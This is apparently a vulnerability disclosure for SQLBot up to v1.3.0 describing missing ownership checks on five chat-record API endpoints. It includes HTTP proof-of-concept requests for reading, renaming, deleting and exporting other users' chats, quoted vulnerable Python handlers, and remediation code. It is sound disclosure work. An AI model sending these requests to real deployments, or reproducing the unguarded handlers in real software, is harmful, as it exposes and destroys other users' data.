# Missing Authorization in Chat Record Management APIs

## 1. Vulnerability Title
Missing Authorization Check in Chat Record Management APIs of SQLBot

## 2. Product Details
* **Vendor:** SQLBot Team
* **Product:** SQLBot
* **Affected Version(s):** <= v1.3.0
* **Fixed Version:** N/A

## 3. Vulnerability Type (CWE)
* **CWE ID:** CWE-285 (Improper Authorization)
* **Type Name:** Broken Function Level Authorization (BFLA)

## 4. Description (Crucial for CVE Entry)
SQLBot version 1.3.0 and earlier contains missing authorization vulnerabilities in the Chat Record Management APIs, allowing any authenticated user to view chat data, view predict data, rename chats, delete chats, and export chat data to Excel for any chat record without proper authorization checks.

## 5. Impact
* **Impact Description:** An authenticated attacker with low privileges can:
  - View chat record data from any user's conversations
  - View prediction data from any chat record
  - Rename any user's chat sessions
  - Delete any user's chat sessions
  - Export any chat data to Excel files
* **Attack Vector:** Network (Remote)
* **Privileges Required:** Low (Any authenticated user)

## 7. Proof of Concept (PoC) / Steps to Reproduce

### Prerequisites
1. Deploy SQLBot application
2. Login as a low-privileged user and obtain a valid `x-sqlbot-token`

### PoC 1: Get Chat Record Data (GET /chat/record/{id}/data)

```http
GET /api/v1/chat/record/1/data HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Returns chat record data without verifying ownership.

### PoC 2: Get Chat Predict Data (GET /chat/record/{id}/predict_data)

```http
GET /api/v1/chat/record/1/predict_data HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Returns prediction data without verifying ownership.

### PoC 3: Rename Chat (POST /chat/rename)

```http
POST /api/v1/chat/rename HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

{
    "id": 1,
    "name": "Attacker Renamed This"
}
```

**Result:** Renames any chat session without verifying ownership.

### PoC 4: Delete Chat (DELETE /chat/{chart_id})

```http
DELETE /api/v1/chat/1 HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Deletes any chat session without verifying ownership.

### PoC 5: Export Chat to Excel (GET /chat/record/{id}/excel/export)

```http
GET /api/v1/chat/record/1/excel/export HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Exports any chat data to Excel without verifying ownership.

## 8. Vulnerable Code Location

**File:** `backend/apps/chat/api/chat.py`

| Endpoint | Method | Lines | Description |
|----------|--------|-------|-------------|
| /chat/record/{id}/data | GET | 45-51 | Get chat chart data |
| /chat/record/{id}/predict_data | GET | 54-60 | Get chat predict data |
| /chat/rename | POST | 63-71 | Rename chat |
| /chat/{chart_id} | DELETE | 74-82 | Delete chat |
| /chat/record/{id}/excel/export | GET | 206-276 | Export chat to Excel |

### Vulnerable Code: Get Chat Record Data (Lines 45-51)

```python
@router.get("/record/{chat_record_id}/data")
async def chat_record_data(session: SessionDep, chat_record_id: int):
    # Missing: current_user: CurrentUser parameter
    # Missing: Ownership verification
    def inner():
        data = get_chat_chart_data(chat_record_id=chat_record_id, session=session)
        return format_json_data(data)
    return await asyncio.to_thread(inner)
```

### Vulnerable Code: Rename Chat (Lines 63-71)

```python
@router.post("/rename")
async def rename(session: SessionDep, chat: RenameChat):
    # Missing: current_user: CurrentUser parameter
    # Missing: Ownership verification
    try:
        return rename_chat(session=session, rename_object=chat)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
```

### Vulnerable Code: Delete Chat (Lines 74-82)

```python
@router.delete("/{chart_id}")
async def delete(session: SessionDep, chart_id: int):
    # Missing: current_user: CurrentUser parameter
    # Missing: Ownership verification
    try:
        return delete_chat(session=session, chart_id=chart_id)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
```

### Vulnerable Code: Export Excel (Lines 206-276)

```python
@router.get("/record/{chat_record_id}/excel/export")
async def export_excel(session: SessionDep, chat_record_id: int, trans: Trans):
    # Missing: current_user: CurrentUser parameter
    # Missing: Ownership verification
    chat_record = session.get(ChatRecord, chat_record_id)
    if not chat_record:
        raise HTTPException(status_code=500, detail=f"ChatRecord with id {chat_record_id} not found")
    # ... exports data without verifying ownership
```

## 9. Remediation

Add proper authorization checks to verify chat ownership:

```python
from common.core.deps import CurrentUser

@router.get("/record/{chat_record_id}/data")
async def chat_record_data(session: SessionDep, current_user: CurrentUser, chat_record_id: int):
    chat_record = session.get(ChatRecord, chat_record_id)
    if not chat_record:
        raise HTTPException(status_code=404, detail="Chat record not found")
    # Verify ownership
    if chat_record.create_by != current_user.id and not current_user.isAdmin:
        raise HTTPException(status_code=403, detail="Access denied")
    # ... rest of the code

@router.delete("/{chart_id}")
async def delete(session: SessionDep, current_user: CurrentUser, chart_id: int):
    chat = session.get(Chat, chart_id)
    if not chat:
        raise HTTPException(status_code=404, detail="Chat not found")
    # Verify ownership
    if chat.create_by != current_user.id and not current_user.isAdmin:
        raise HTTPException(status_code=403, detail="Access denied")
    # ... rest of the code
```

## 10. Summary Table

| Endpoint | Method | Severity | Impact |
|----------|--------|----------|--------|
| /chat/record/{id}/data | GET | Medium | View any chat data |
| /chat/record/{id}/predict_data | GET | Medium | View any predict data |
| /chat/rename | POST | Medium | Rename any chat |
| /chat/{chart_id} | DELETE | High | Delete any chat |
| /chat/record/{id}/excel/export | GET | Medium | Export any chat data |
